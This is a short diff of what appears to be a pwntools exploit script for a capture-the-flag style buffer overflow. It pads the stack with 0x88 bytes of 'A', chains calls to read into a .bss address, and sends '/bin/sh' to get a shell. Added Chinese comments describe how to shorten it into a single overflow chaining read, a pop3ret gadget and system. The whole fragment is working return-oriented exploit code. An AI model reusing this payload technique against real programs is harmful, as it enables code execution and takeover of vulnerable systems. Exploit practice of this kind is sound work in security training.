@@ -191,12 +191,16 @@ print system_addr
 read_bin_sh=flat([
     "A"*0x88,
     'A'*4,
-    read_plt,
+    read_plt, 
     main_addr,
     0,
     bss_addr,
     8,
 ])
+#其实可以简化一下,一次溢出就够了,要将read函数的参数pop出来
+#payload1 += p32(read_plt) + p32(pop3ret)
+#payload1 += p32(0) + p32(bss_addr) + p32(8)
+#payload1 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
 sh.sendline(read_bin_sh)
 sh.send('/bin/sh\x00')
 
